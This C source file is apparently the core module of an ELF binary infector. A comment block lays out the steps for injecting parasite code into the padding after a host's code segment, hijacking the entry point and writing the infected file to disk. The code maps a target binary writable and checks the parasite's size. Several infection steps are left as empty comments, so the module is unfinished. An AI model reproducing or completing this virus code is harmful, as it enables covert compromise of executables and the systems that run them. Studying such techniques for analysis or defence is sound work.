// Author : Abhinav Thakur
// Email  : compilepeace@gmail.com

// Description : This module contains the actual infection code


#include <stdio.h>
#include <string.h>
#include <elf.h>
#include <sys/mman.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>

#include "color.h"
#include "operations.h"



/********************  ALGORITHM   *********************


--- Load parasite from file into memory
1.	Get parasite_size and parasite_code addresss (location in allocated memory)


--- Find padding_size between CODE segment and the NEXT segment after CODE segment
2.	CODE segment : increase
		-> p_filesz 		(by parasite size)
		-> p_memsz 			(by parasite size)
	Set,	
	padding_size 	= (offset of next segment (after CODE segment)) - (end of CODE segment)
	parasite_offset = (end of CODE segment) or (end of last section of CODE segment)


---	PATCH Host entry point
3.	Save original_entry_point_offset (e_entry) and replace it with parasite_offset


--- PATCH Parasite offset
4.	Find and replace Parasite jmp exit addresss with original_entry_point_offset 0x????????


--- PATCH SHT
4.  Find the last section in CODE Segment and increase - 
        -> sh_size 			(by parasite size)


---	Inject Parasite to Host @ map_address
5.	Inject parasite code to (map_address + parasite_offset)


6.	Write infection to disk x_x

*/




//  CRITICAL GLOBAL VARIABLES 


Elf64_Off		parasite_offset;				// Parasite host residence
uint64_t		parasite_size;					
uint8_t			*parasite_code;					// Parasite residence (in memory before meeting its host )

uint64_t		padding_size;					// Home size (in bytes) of parasite residence in host

Elf64_Addr		original_entry_point_offset;	// Host entry point

void			*map_address;					// Host mmap'd address



void ElfParser(char *filepath)
{
	mmap_file(filepath);

	
	// Load Parasite into memory (from disk)
	

	// Check if host's home size can accomodate a parasite this big in size
	padding_size = FindPaddingSize();
	if (padding_size < parasite_size)
	{
		fprintf(stderr, RED"[+]"RESET" Host cannot accomodate parasite, parasite is angry x_x \n"); 
		exit(0x60);
	}


	// Patch host entry point


	// Patch Parasite jmp-on-exit address	
	FindAndReplace();


	// Patch SHT

}



void mmap_file(char *file)
{
	uint64_t	binary_size;


	// Open the file
    int fd = open(file, O_RDWR);
        if (fd == -1) {
            perror(RED"[-]"RESET"evil_elf.c - mmap_file() - open():");
            exit(0x60);
        }


    // Get the binary_size using lstat()
    struct stat statbuf;
        if (lstat(file, &statbuf) != 0) {
            perror(RED"[-]"RESET"elf.c - Infect(), lstat():");
            exit(0x61);
        }
        binary_size = statbuf.st_size;


    // Map the file into memory for instrumentation.
    // NOTE: If mapping is MAP_SHARED mmap will perform COPY-ON-WRITE to fd.
    //       else if mapping is MAP_PRIVATE, no COPY-ON-WRITE will be performed. 
    map_address = mmap(NULL, binary_size, PROT_WRITE, MAP_SHARED, fd, 0);
        if (map_address == MAP_FAILED) {
            perror("evil_elf.c - Infect(), mmap():");
            exit(0x62);
        }
}
